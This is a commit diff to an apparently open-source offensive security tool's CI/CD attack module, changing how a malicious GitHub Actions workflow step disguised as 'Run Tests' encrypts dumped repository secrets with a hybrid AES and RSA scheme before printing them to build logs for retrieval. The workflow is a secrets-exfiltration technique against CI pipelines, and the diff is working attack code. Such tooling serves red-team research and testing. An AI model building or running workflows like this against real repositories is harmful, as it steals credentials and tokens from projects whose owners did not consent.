903bf74980d18138bb9dcbb9d639de4796bbd280
Adnan Khan <AdnaneKhan@users.noreply.github.com>
2023-12-07 16:18:27 -0500

    Bug Fixes and Secrets Exfil Improvement (#50)
    Co-authored-by: Mason Davis <31484153+mas0nd@users.noreply.github.com>
    Co-authored-by: Remy <remy.trompier@gmail.com>

--- gato/attack/cicd_attack.py
+++ gato/attack/cicd_attack.py
@@ -94,7 +94,8 @@ class CICDAttack():
 
         echo_cmd += '"'
 
-        pkey_varname = f'{branch_name}_KEY'
+        # variables don't support hyphens, so replace them with underscores.
+        pkey_varname = f'{branch_name.replace("-", "_")}_KEY'
         secret_envmap[pkey_varname] = pubkey
 
         yaml_file['name'] = branch_name
@@ -106,9 +107,13 @@ class CICDAttack():
                 {
                     'name': 'Run Tests',
                     'env': secret_envmap,
-                    'run': f"{echo_cmd} | openssl rsautl -encrypt -inkey"
-                           f" <(echo \"${pkey_varname}\") -pubin -pkcs |"
-                           " base64 -w 0"
+                    'run': "openssl rand -out sym.key 32; echo -n '$';"
+                           f"{echo_cmd} | openssl enc -aes-256-cbc -kfile "
+                           "sym.key -pbkdf2 | base64 -w 0 | tr -d '\\n';"
+                           f"echo '$'; echo -n '$'; cat sym.key | base64 | "
+                           "openssl rsautl -encrypt -inkey "
+                           f"<(echo \"${pkey_varname}\") -pubin -pkcs | "
+                           "base64 -w 0 | tr -d '\\n'; echo '$'"
                 }
             ]
         }
